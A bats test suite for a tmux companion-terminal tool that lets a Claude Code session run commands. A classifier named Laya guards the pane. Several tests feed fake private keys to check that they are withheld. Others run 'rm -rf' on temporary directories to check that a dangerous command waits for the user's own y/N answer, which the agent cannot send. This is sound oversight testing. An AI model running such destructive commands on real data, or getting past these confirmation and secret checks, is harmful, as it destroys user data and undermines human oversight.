#!/usr/bin/env bats

bats_require_minimum_version 1.5.0

load test_helper

REAL_TMUX="$(command -v tmux)"
TERMINAL="$SCRIPTS_DIR/terminal.sh"

# test_helper's setup() is deliberately NOT reused here: it calls
# install_stubs, and the committed tmux stub would shadow the real tmux that
# these end-to-end tests exist to drive. Everything else it does is repeated
# below, including its teardown cleanup.
setup() {
    unset CLAUDE_CODE_SESSION_ID CLUX_SESSION_ID CLAUDE_PID
    export HOME="$BATS_TEST_TMPDIR/home"
    # A short root, not BATS_TEST_TMPDIR: `open --socket` puts its socket
    # inside this directory and tmux caps that path at ~100 bytes.
    export CLUX_TERMINAL_DIR
    CLUX_TERMINAL_DIR=$(mktemp -d /tmp/ct.XXXX)
    export TMUX_SOCKET="$BATS_TEST_TMPDIR/owner.sock"
    mkdir -p "$HOME"
    "$REAL_TMUX" -S "$TMUX_SOCKET" -f /dev/null new-session -d -s owner -x 120 -y 40 3>&-
    local pid
    pid=$("$REAL_TMUX" -S "$TMUX_SOCKET" display-message -p '#{pid}')
    export TMUX="$TMUX_SOCKET,$pid,0"
    export TMUX_PANE
    TMUX_PANE=$("$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -F '#{pane_id}')
    # The companion needs Laya (spec section 13): the fake server answers
    # "all safe" unless a test changes its answers.
    require_laya_python
    start_fake_laya '{}'
}

teardown() {
    local sock
    stop_fake_laya
    stop_holders
    for sock in "$CLUX_TERMINAL_DIR"/*/sock "$CLUX_TERMINAL_DIR"/sessions/*/sock; do
        [ -S "$sock" ] && "$REAL_TMUX" -S "$sock" kill-server >/dev/null 2>&1 || true
    done
    # bg_setup: the default server of the test and the owner process.
    # An empty bg-tmpdir would name the default server of the user: skip it.
    if [ -s "$BATS_TEST_TMPDIR/bg-tmpdir" ] && [ -n "$(cat "$BATS_TEST_TMPDIR/bg-tmpdir")" ]; then
        env -u TMUX TMUX_TMPDIR="$(cat "$BATS_TEST_TMPDIR/bg-tmpdir")" "$REAL_TMUX" kill-server >/dev/null 2>&1 || true
        rm -rf "$(cat "$BATS_TEST_TMPDIR/bg-tmpdir")"
    fi
    [ ! -f "$BATS_TEST_TMPDIR/bg-owner" ] || kill "$(cat "$BATS_TEST_TMPDIR/bg-owner")" 2>/dev/null || true
    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-server >/dev/null 2>&1 || true
    rm -rf "$CLUX_TERMINAL_DIR" "$BATS_TEST_TMPDIR"
}

# The private directory of this owner. One owner per test, so one match.
companion_dir() {
    local dir
    for dir in "$CLUX_TERMINAL_DIR"/*-"${TMUX_PANE#%}"; do
        printf '%s' "$dir"
    done
}

companion_pane() {
    sed -n 's/^pane=//p' "$(companion_dir)/state"
}

file_mode() {
    stat -f %Lp "$1" 2>/dev/null || stat -c %a "$1"
}

# prompt_mark — the prompt of the companion: clux-<token>$.
prompt_mark() {
    printf 'clux-%s$' "$(sed -n 's/^token=//p' "$(companion_dir)/state")"
}

# pane_shows TEXT — wait at most 5 s until the companion pane shows TEXT.
pane_shows() {
    local i=0
    while [ "$i" -lt 50 ]; do
        "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" | grep -qF -- "$1" && return 0
        sleep .1
        i=$((i + 1))
    done
    return 1
}

# bg_setup — a background Claude session: no TMUX and no TMUX_PANE, a
# session id, and an owner process (a sleep of the test). TMUX_TMPDIR makes
# the default tmux server a test server, with the dashboard session "dash".
bg_setup() {
    local raw
    unset TMUX TMUX_PANE CLUX_SESSION_ID
    export TMUX_TMPDIR
    raw=$(mktemp -d /tmp/ctt.XXXX)
    [ -n "$raw" ] && [ -d "$raw" ] || { echo 'bg_setup: no test tmux directory'; return 1; }
    # tmux resolves TMUX_TMPDIR with realpath. On macOS /tmp is a link to
    # /private/tmp, so the guard below needs the resolved path, as the
    # prototype does (test.sh, pwd -P). [inferred] The cd is a separate step:
    # with an empty mktemp result, cd would stay in the current directory.
    TMUX_TMPDIR=$(cd "$raw" && pwd -P) && [ -n "$TMUX_TMPDIR" ] && [ -d "$TMUX_TMPDIR" ] \
        || { echo 'bg_setup: no test tmux directory'; return 1; }
    printf '%s\n' "$TMUX_TMPDIR" > "$BATS_TEST_TMPDIR/bg-tmpdir"
    export CLUX_AGENT_STATE_DIR="$BATS_TEST_TMPDIR/agents"
    export CLAUDE_CODE_SESSION_ID=0123abcd-4567-4890-abcd-ef0123456789
    sleep 600 </dev/null >/dev/null 2>&1 3>&- &
    export CLAUDE_PID=$!
    printf '%s\n' "$CLAUDE_PID" > "$BATS_TEST_TMPDIR/bg-owner"
    "$REAL_TMUX" -f /dev/null new-session -d -s dash -x 120 -y 40 3>&-
    # The isolation guard of the prototype: the default server must be the
    # test server. Test 4 stops the default server; it must never be the
    # server of the user.
    case "$("$REAL_TMUX" display-message -p '#{socket_path}')" in
        "$TMUX_TMPDIR"/*) ;;
        *) echo 'bg_setup: the default tmux server is not the test server'; return 1 ;;
    esac
    BG_DASH_PANE=$("$REAL_TMUX" list-panes -t dash -F '#{pane_id}')
    BG_DASH_KEY=$("$REAL_TMUX" display-message -p '#{pid}-#{start_time}')
}

# bg_add_cache — the agent-state file that maps the session to the
# dashboard pane, as hooks/agent-state.sh writes it at the first prompt.
bg_add_cache() {
    local sid="${CLUX_SESSION_ID:-$CLAUDE_CODE_SESSION_ID}"
    mkdir -p "$CLUX_AGENT_STATE_DIR/$BG_DASH_KEY/agents"
    : > "$CLUX_AGENT_STATE_DIR/$BG_DASH_KEY/agents/$BG_DASH_PANE~$sid"
}

# bg_dir — the private directory of the session owner of the test.
bg_dir() {
    local sid="${CLUX_SESSION_ID:-$CLAUDE_CODE_SESSION_ID}"
    printf '%s' "$CLUX_TERMINAL_DIR/sessions/${sid:0:8}"
}

# bg_window_count — the number of windows in the dashboard session.
bg_window_count() {
    "$REAL_TMUX" list-windows -t dash | wc -l | tr -d ' '
}

# lock_holder DIR — a live process that holds the lock of DIR, as a second
# verb does (hold_lock). stop_holders stops all of them (teardown does it too).
lock_holder() {
    hold_lock "$1.lock"
}

# 1
@test "open makes a split pane and a second open re-uses it" {
    run "$TERMINAL" open
    [ "$status" -eq 0 ]
    [[ "$output" == *'mode=split'* ]] || false
    local first="$output"
    run "$TERMINAL" open
    [ "$status" -eq 0 ]
    [ "$output" = "$first" ]
}

# 2
@test "run returns the output and the exit code, also after a large output" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'hi\nexit=0' ]] || false
    run "$TERMINAL" run -- false
    [ "$status" -eq 0 ]
    [[ "$output" == *'exit=1' ]] || false
    run "$TERMINAL" run -- 'seq 1 30000'
    [ "$status" -eq 0 ]
    [[ "$output" == *'30000'* ]] || false
    [[ "$output" == *'output cut'* ]] || false
    [ "$(printf '%s\n' "$output" | grep -c '^[0-9]*$')" -le 200 ]
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ] || { echo "after large output: $status $output"; false; }
}

# 2b
@test "run --max-lines cuts the output" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --max-lines 3 -- 'seq 1 10'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'8\n9\n10\nexit=0' ]] || false
    [[ "$output" != *$'\n7\n'* ]] || false
}

# 3
@test "the working directory stays from one run to the next" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" run -- 'cd /tmp' >/dev/null
    run "$TERMINAL" run -- 'pwd'
    [[ "$output" == *$'/tmp\nexit=0' ]] || false
}

# 4
@test "an exported variable stays from one run to the next" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" run -- 'export X=1' >/dev/null
    run "$TERMINAL" run -- 'echo $X'
    [[ "$output" == *$'1\nexit=0' ]] || false
}

@test "an EXIT trap of the command runs, and set -u in the command does not stop the keep file" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'trap "echo trap-ran" EXIT; set -u; cd /tmp; export Y=2'
    [[ "$output" == *$'trap-ran\nexit=0' ]] || false
    run "$TERMINAL" run -- 'echo "$(pwd) $Y"'
    [[ "$output" == *$'/tmp 2\nexit=0' ]] || false
    # The trap of the command ran one time: it is not in the pane shell.
    run "$TERMINAL" run -- 'echo next'
    [[ "$output" != *trap-ran* ]] || false
}

@test "run of cat of a certificate with no newline at its end and a key shows no line of the key" {
    printf '%s\n%s\n%s' '-----BEGIN CERTIFICATE-----' 'MIIBszCCAVmgAwIBAgIUcert' '-----END CERTIFICATE-----' > "$BATS_TEST_TMPDIR/c.pem"
    printf '%s\n' '-----BEGIN RSA PRIVATE KEY-----' 'MIIEowIBAAKCAQEAkeybodyline1' 'kkeybodyline2xxxxxxxxxxxxxx' '-----END RSA PRIVATE KEY-----' > "$BATS_TEST_TMPDIR/k.pem"
    "$TERMINAL" open >/dev/null
    # head -n 5 cuts the output before the END line of the key.
    # A key with no END holds to the end of the text. The plain lines above
    # keep the half rule from a hold of the full block.
    run "$TERMINAL" run -- "seq 1 20 | sed 's/^/plain line /'; cat '$BATS_TEST_TMPDIR/c.pem' '$BATS_TEST_TMPDIR/k.pem' | head -n 5"
    [[ "$output" != *keybody* ]] || { echo "$output"; false; }
    [[ "$output" == *'plain line 20'*'[held by laya: secret'*'exit=0' ]] || { echo "$output"; false; }
}

@test "run of the end of a key file shows no line of the key" {
    printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ' \
        'QyNTUxOQAAACBkeybodyline2xxxxxxxxxxxxxxxxx' '-----END OPENSSH PRIVATE KEY-----' > "$BATS_TEST_TMPDIR/k"
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- "tail -n 3 '$BATS_TEST_TMPDIR/k'"
    [[ "$output" != *b3BlbnNz* ]] && [[ "$output" != *keybody* ]] || { echo "$output"; false; }
    [[ "$output" == *'[held by laya: secret, 3 lines]'* ]] || { echo "$output"; false; }
}

# 5
@test "the output file is deleted and the private files are private" {
    "$TERMINAL" open >/dev/null
    local d
    d=$(companion_dir)
    "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/made'" >/dev/null
    [ "$(file_mode "$d")" = 700 ]
    [ "$(file_mode "$d/state")" = 600 ]
    [ "$(file_mode "$d/1.rc")" = 600 ]
    [ ! -e "$d/1.out" ]
    [ "$(file_mode "$BATS_TEST_TMPDIR/made")" != 600 ]
}

# 6
@test "run stops at its time limit and wait --run gets the result" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'echo early; sleep 3; echo late'
    [ "$status" -eq 1 ]
    [[ "$output" == 'run=1'* ]] || false
    [ "$(file_mode "$(companion_dir)/1.out")" = 600 ]
    run "$TERMINAL" wait --timeout 10 --max-lines 1 --run 1
    [ "$status" -eq 0 ]
    [[ "$output" == $'output cut: the last 1 of 2 lines\nlate\nexit=0' ]] || false
    [ ! -d "$(companion_dir)/busy" ]
}

# 7
@test "a second run while the first is not complete exits 5" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'sleep 3'
    [ "$status" -eq 1 ]
    run "$TERMINAL" run -- 'echo no'
    [ "$status" -eq 5 ]
}

# 7b
@test "a lock left by a completed run does not block the next run" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'sleep 2'
    [ "$status" -eq 1 ]
    sleep 3
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'next\nexit=0' ]] || false
}

# 8
@test "a credential prompt stops run, read and wait until the user answers" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'read -s -p "Password: " p; echo "got:$p"'
    [ "$status" -eq 3 ]
    [[ "$output" != *'Password'* ]] || false
    run "$TERMINAL" read
    [ "$status" -eq 3 ]
    [[ "$output" != *'Password'* ]] || false
    local start=$SECONDS
    run "$TERMINAL" wait --timeout 3 --run 1
    [ "$status" -eq 1 ]
    [ $((SECONDS - start)) -ge 2 ]
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" 'hunter2' Enter
    run "$TERMINAL" wait --timeout 10 --run 1
    [ "$status" -eq 0 ]
    [ "$output" = 'exit=0' ]
}

# 9
@test "run --secret returns only the exit code and blocks wait --pattern" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --secret -- 'echo token'
    [ "$status" -eq 0 ]
    [ "$output" = $'run=1\nexit=0' ]
    run "$TERMINAL" wait --timeout 2 --pattern token
    [ "$status" -eq 3 ]
    run "$TERMINAL" read
    [ "$status" -eq 3 ]
}

# 10
@test "send, wait and read control interactive work" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send --enter -- 'read -p "Name? " name; echo "hello:$name"'
    [ "$status" -eq 0 ]
    run "$TERMINAL" wait --timeout 5 --pattern 'Name\?'
    [ "$status" -eq 0 ]
    "$TERMINAL" send --enter -- Ada
    run "$TERMINAL" wait --timeout 5 --idle
    [ "$status" -eq 0 ]
    run "$TERMINAL" read --lines 20
    [[ "$output" == *'hello:Ada'* ]] || false
}

@test "a sh -c script that reads a line takes Enter from send, as npm or make start it" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 2 -- "sh -c 'read -p \"Name? \" n; echo \"hello:\$n\"'"
    [ "$status" -eq 1 ] || { echo "$status $output"; false; }
    run "$TERMINAL" send --enter -- Ada
    [ "$status" -eq 0 ] || { echo "$status $output"; false; }
    run "$TERMINAL" wait --timeout 10 --run 1
    [[ "$output" == *$'hello:Ada\nexit=0' ]] || { echo "$output"; false; }
}

# wait --idle must actually wait. A `wait` that returns 0 immediately also
# passes the case above, so this case pins the busy answer.
@test "wait --idle reports busy while a command runs, idle once it ends" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 4' >/dev/null
    run "$TERMINAL" wait --timeout 1 --idle
    [ "$status" -eq 1 ] || { echo "expected busy (1), got $status"; false; }
    run "$TERMINAL" wait --timeout 10 --idle
    [ "$status" -eq 0 ] || { echo "expected idle (0), got $status"; false; }
}

# 11
@test "close removes the pane and the directory, close --hook is silent" {
    "$TERMINAL" open >/dev/null
    local pane
    pane=$(companion_pane)
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    [ -z "$(find "$CLUX_TERMINAL_DIR" -mindepth 1 -maxdepth 1 -print -quit)" ]
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null 2>&1 || false
    run bash -c "printf x | '$TERMINAL' close --hook"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

# 11b
@test "close --owner closes the companion of another owner pane" {
    "$TERMINAL" open >/dev/null
    local owner="$TMUX_PANE"
    run env TMUX_PANE=%999 "$TERMINAL" close --owner "$owner"
    [ "$status" -eq 0 ]
    [ -z "$(find "$CLUX_TERMINAL_DIR" -mindepth 1 -maxdepth 1 -print -quit)" ]
}

# 12
@test "the reaper removes a gone owner and keeps a live foreign server" {
    local key other="$BATS_TEST_TMPDIR/other.sock" foreign
    key=$("$REAL_TMUX" -S "$TMUX_SOCKET" display-message -p '#{pid}-#{start_time}')
    "$REAL_TMUX" -S "$other" -f /dev/null new-session -d 3>&-
    foreign=$("$REAL_TMUX" -S "$other" display-message -p '#{pid}-#{start_time}')
    # $$ is a live process that is not tmux: the pid of a dead foreign
    # server that another process now has. The live foreign server with a
    # start time 100 s before its own: the pid of a dead server that a new
    # tmux server now has.
    local reused="${foreign%%-*}-$(( ${foreign#*-} - 100 ))"
    mkdir -p "$CLUX_TERMINAL_DIR/$key-999" "$CLUX_TERMINAL_DIR/$foreign-3" "$CLUX_TERMINAL_DIR/$$-1-3" \
        "$CLUX_TERMINAL_DIR/$reused-4"
    "$TERMINAL" open >/dev/null
    "$REAL_TMUX" -S "$other" kill-server
    [ ! -e "$CLUX_TERMINAL_DIR/$key-999" ] || { echo 'the gone owner stays'; false; }
    [ -d "$CLUX_TERMINAL_DIR/$foreign-3" ] || { echo 'the live foreign server was removed'; false; }
    [ ! -e "$CLUX_TERMINAL_DIR/$$-1-3" ] || { echo 'a pid that is not tmux keeps its directory'; false; }
    [ ! -e "$CLUX_TERMINAL_DIR/$reused-4" ] || { echo 'a reused tmux pid keeps its directory'; false; }
}

# 14
@test "a completed run keeps output that looks like a credential line" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'echo token: abc'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'token: abc\nexit=0' ]] || false
}

# 15
@test "a background process that holds the output gives a note and no lock" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'sleep 4 & echo started'
    [ "$status" -eq 0 ]
    [[ "$output" == *'started'* ]] || false
    [[ "$output" == *'output may be incomplete'* ]] || false
    [[ "$output" == *'exit=0' ]] || false
    [ ! -d "$(companion_dir)/busy" ]
}

# 16
@test "open makes a new companion after the pane is killed" {
    "$TERMINAL" open >/dev/null
    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-pane -t "$(companion_pane)"
    run "$TERMINAL" open
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'hi\nexit=0' ]] || false
}

# 17
@test "exit cannot close the pane shell" {
    "$TERMINAL" open >/dev/null
    local pane
    pane=$(companion_pane)
    # exit ends only the subshell of the run.
    run "$TERMINAL" run -- 'exit'
    [ "$status" -eq 0 ]
    [[ "$output" == *'exit=0' ]] || false
    run "$TERMINAL" run -- 'echo a; exit 7'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'a\nexit=7' ]] || { echo "$output"; false; }
    run "$TERMINAL" run -- 'exec true'
    [[ "$output" == *'exit=0' ]] || { echo "$output"; false; }
    "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null
    run "$TERMINAL" run -- 'echo alive'
    [[ "$output" == *$'alive\nexit=0' ]] || false
}

# 18
@test "output with no final newline keeps exit on its own line" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'printf hi'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'\nhi\nexit=0' ]] || false
    run "$TERMINAL" run -- 'echo after'
    [ "$status" -eq 0 ]
}

# 19
@test "the next plain run clears a secret from the screen and the history" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" run --secret -- 'echo token' >/dev/null
    run "$TERMINAL" run -- true
    [ "$status" -eq 0 ]
    run "$TERMINAL" read
    [ "$status" -eq 0 ]
    [[ "$output" != *'token'* ]] || false
    run "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" -S -50
    [[ "$output" != *'token'* ]] || false
}

# 20
@test "a command cannot change the wrapper variables or leave the wrapper" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'for n in 7 8; do echo $n; done'
    [[ "$output" == *$'7\n8\nexit=0' ]] || false
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'D=oops; echo hi'
    [[ "$output" == *$'hi\nexit=0' ]] || false
    # return ends only the subshell of the command; the wrapper reports.
    run "$TERMINAL" run -- 'return 5; echo AFTER-RETURN'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [[ "$output" != *$'\nAFTER-RETURN'* ]] || { echo "$output"; false; }
    [[ "$output" == *'exit=5' ]] || { echo "$output"; false; }
    run "$TERMINAL" run -- 'echo hi'
    [[ "$output" == *$'hi\nexit=0' ]] || false
}

# 21
@test "wait --idle stops on a credential prompt" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'read -s -p "Password: " p' >/dev/null
    run "$TERMINAL" wait --timeout 5 --idle
    [ "$status" -eq 3 ]
}

@test "socket mode opens a private server and close stops it" {
    run "$TERMINAL" open --socket
    [ "$status" -eq 0 ]
    [[ "$output" == *'mode=socket'* ]] || false
    [[ "$output" == *'attach=tmux -S '* ]] || false
    local sock
    sock="$(companion_dir)/sock"
    run "$TERMINAL" open --socket
    [[ "$output" == *'attach=tmux -S '* ]] || false
    run "$TERMINAL" run -- 'echo private'
    [[ "$output" == *$'private\nexit=0' ]] || false
    "$TERMINAL" close
    ! "$REAL_TMUX" -S "$sock" list-sessions >/dev/null 2>&1 || false
}

# Laya 6
@test "close stops the laya server that open started and deletes laya.log" {
    local data="$BATS_TEST_TMPDIR/data" d pid
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    run env CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    d=$(companion_dir)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    [ -n "$pid" ]
    ps -o command= -p "$pid" | grep -q laya-serve
    [ "$(file_mode "$d/laya.log")" = 600 ]
    grep -q '^laya_url=http://127.0.0.1:[0-9][0-9]*$' "$d/state"
    grep -Eq '^laya_key=[0-9a-f]{64}$' "$d/state"
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    ! kill -0 "$pid" 2>/dev/null || false
    [ ! -e "$d" ]
}

@test "close --hook removes the pane and the directory first and does not wait for the server" {
    local data="$BATS_TEST_TMPDIR/data" d pid pane start
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    CLUX_FAKE_LAYA_IGNORE_TERM=1 CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
    d=$(companion_dir)
    pane=$(companion_pane)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    kill -0 "$pid"
    start=$SECONDS
    run "$TERMINAL" close --hook < /dev/null
    local took=$((SECONDS - start)) alive=0
    ! kill -0 "$pid" 2>/dev/null || alive=1
    # The server ignores TERM, so it holds the bats output until kill -9.
    kill -9 "$pid" 2>/dev/null || true
    [ "$status" -eq 0 ]
    [ "$took" -lt 2 ]
    [ "$alive" -eq 1 ]
    [ ! -e "$d" ]
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null 2>&1 || false
}

@test "close --hook still stops a server that ignores TERM, after the hook ends" {
    local data="$BATS_TEST_TMPDIR/data" d pid i=0
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    CLUX_FAKE_LAYA_IGNORE_TERM=1 CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
    d=$(companion_dir)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    "$TERMINAL" close --hook < /dev/null
    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 30 ]; do sleep .2; i=$((i + 1)); done
    local alive=0
    ! kill -0 "$pid" 2>/dev/null || alive=1
    kill -9 "$pid" 2>/dev/null || true
    [ "$alive" -eq 0 ]
}

@test "open stops the laya server of a dead companion of the same owner" {
    local data="$BATS_TEST_TMPDIR/data" d pid i=0
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        "$TERMINAL" open >/dev/null
    d=$(companion_dir)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    kill -0 "$pid"
    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-pane -t "$(companion_pane)"
    CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        "$TERMINAL" open >/dev/null
    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 25 ]; do sleep .2; i=$((i + 1)); done
    ! kill -0 "$pid" 2>/dev/null || { kill -9 "$pid"; false; }
    "$TERMINAL" close
}

@test "the reaper stops the laya server of an owner pane that is gone" {
    local data="$BATS_TEST_TMPDIR/data" other pid
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    other=$("$REAL_TMUX" -S "$TMUX_SOCKET" split-window -d -P -F '#{pane_id}' -t "$TMUX_PANE" 3>&-)
    TMUX_PANE="$other" CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" open >/dev/null
    pid=$(sed -n 's/^laya_pid=//p' "$CLUX_TERMINAL_DIR"/*-"${other#%}"/state)
    [ -n "$pid" ]
    kill -0 "$pid"
    "$REAL_TMUX" -S "$TMUX_SOCKET" kill-pane -t "$other"
    "$TERMINAL" open >/dev/null
    ! kill -0 "$pid" 2>/dev/null || false
}

@test "wait --idle prints the pane state at its time limit" {
    set_fake_laya '{"answers": {"state": "pager"}}'
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 3' >/dev/null
    run "$TERMINAL" wait --timeout 1 --idle
    [ "$status" -eq 1 ]
    [ "$output" = 'pane=pager' ]
}

@test "wait --idle exits 6 after three failed pane probes in a row, not after one" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
    stop_fake_laya
    run "$TERMINAL" wait --timeout 2 --idle
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 10 --idle
    [ "$status" -eq 6 ]
    [[ "$output" == *'laya not available: close and open the companion'* ]] || false
}

@test "wait --pattern goes on after one failed pane probe" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
    # Only the pane question fails: the guard of the screen still works.
    set_fake_laya '{"rules": [{"asks": "state", "fail": 500}]}'
    # Two probes in 1 s: fewer than the three failures in a row that stop it.
    run "$TERMINAL" wait --timeout 1 --pattern 'clux-no-match'
    [ "$status" -eq 1 ] || { echo "$output"; false; }
}

@test "wait --run 6 says that the command continues" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 1 -- 'sleep 15'
    [ "$status" -eq 1 ]
    stop_fake_laya
    run "$TERMINAL" wait --timeout 10 --run 1
    [ "$status" -eq 6 ]
    [ "$output" = 'laya not available: run 1 continues in the pane; use wait --run 1 again' ]
}

@test "a wait sends no pane request while the screen does not change" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 15' >/dev/null
    sleep 1
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" wait --timeout 4 --idle
    [ "$status" -eq 1 ]
    [ "$(fake_laya_states state | wc -l | tr -d ' ')" -eq 1 ]
}

@test "a blank cursor line is not the line above it" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'echo abc; read -r x' >/dev/null
    pane_shows abc
    run "$TERMINAL" send --enter -- 'hello'
    [ "$status" -eq 0 ]
    [ "$(fake_laya_states destructive | tail -n 1)" = '"hello"' ]
    # The pane probe gets the blank cursor line as its last line.
    "$TERMINAL" send --enter -- 'read -r y' >/dev/null
    "$TERMINAL" wait --timeout 2 --idle >/dev/null || true
    [[ "$(fake_laya_states state | tail -n 1)" == *'read -r y\n"' ]] || { fake_laya_states state | tail -n 1; false; }
}

@test "a credential answer from Laya stops a run with exit 3" {
    set_fake_laya '{"rules": [{"contains": "Enter value", "answers": {"state": "credential"}}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run --timeout 5 -- 'read -r -p "Enter value " v; echo "got:$v"'
    [ "$status" -eq 3 ]
    [[ "$output" == *'credential prompt in the companion pane'* ]] || false
}

# Laya 1
@test "a dangerous run asks the user in the pane: y runs it, n declines it" {
    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    local one="$BATS_TEST_TMPDIR/clux-danger-1" two="$BATS_TEST_TMPDIR/clux-danger-2" d
    mkdir -p "$one" "$two"
    d=$(companion_dir)
    run "$TERMINAL" run --timeout 2 -- "rm -rf '$one'"
    [ "$status" -eq 1 ]
    [[ "$output" == 'run=1'* ]] || false
    pane_shows 'laya: dangerous (destructive 0.95)'
    pane_shows 'run? [y/N]'
    [ -d "$one" ]
    run "$TERMINAL" send -- 'y'
    [ "$status" -eq 3 ]
    [ "$output" = 'laya confirmation in the companion pane: the user must answer it there' ]
    run "$TERMINAL" read
    [ "$status" -eq 3 ]
    run "$TERMINAL" wait --timeout 1 --idle
    [ "$status" -eq 3 ]
    run "$TERMINAL" wait --timeout 1 --pattern 'x'
    [ "$status" -eq 3 ]
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" y Enter
    run "$TERMINAL" wait --timeout 5 --run 1
    [ "$status" -eq 0 ]
    [[ "$output" == *'exit=0' ]] || false
    [ ! -e "$one" ]
    [ ! -e "$d/1.confirm" ]
    run "$TERMINAL" run --timeout 2 -- "rm -rf '$two'"
    [ "$status" -eq 1 ]
    pane_shows "$two"
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" n Enter
    run "$TERMINAL" wait --timeout 5 --run 2
    [ "$status" -eq 0 ]
    [ "$output" = $'laya: declined by the user\nexit=126' ]
    [ -d "$two" ]
    # Laya examines the screen with each send, so the screen with
    # clux-danger must go first.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" clear Enter
    sleep .5
    "$REAL_TMUX" -S "$TMUX_SOCKET" clear-history -t "$(companion_pane)"
